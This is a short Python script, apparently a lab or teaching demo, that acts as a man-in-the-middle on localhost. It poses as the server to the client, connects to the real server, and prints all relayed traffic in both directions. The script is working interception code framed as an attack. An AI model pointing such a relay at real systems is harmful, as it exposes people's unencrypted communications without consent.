import socket

LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 5000      # the port the client thinks is the server
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 5001      # where the real server is hiding

def attack():
    print("=== ATTACK PROGRAM ===")

    # 1. Pretend to be the server: wait for the client
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((LISTEN_HOST, LISTEN_PORT))
    listener.listen(1)
    print(f"[ATTACKER] Waiting for client on port {LISTEN_PORT}...")
    client_conn, addr = listener.accept()
    print(f"[ATTACKER] Client connected from {addr}")

    # 2. Pretend to be the client: connect to the real server
    server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_conn.connect((SERVER_HOST, SERVER_PORT))
    print(f"[ATTACKER] Connected to real server on port {SERVER_PORT}")

    # 3. Relay everything, but read it first
    while True:
        data = client_conn.recv(1024)
        if not data:
            break
        print(f"[ATTACKER] Intercepted CLIENT -> SERVER: {data.decode()}")
        server_conn.send(data)

        response = server_conn.recv(1024)
        if not response:
            break
        print(f"[ATTACKER] Intercepted SERVER -> CLIENT: {response.decode()}")
        client_conn.send(response)

    client_conn.close()
    server_conn.close()
    listener.close()

if __name__ == "__main__":
    attack()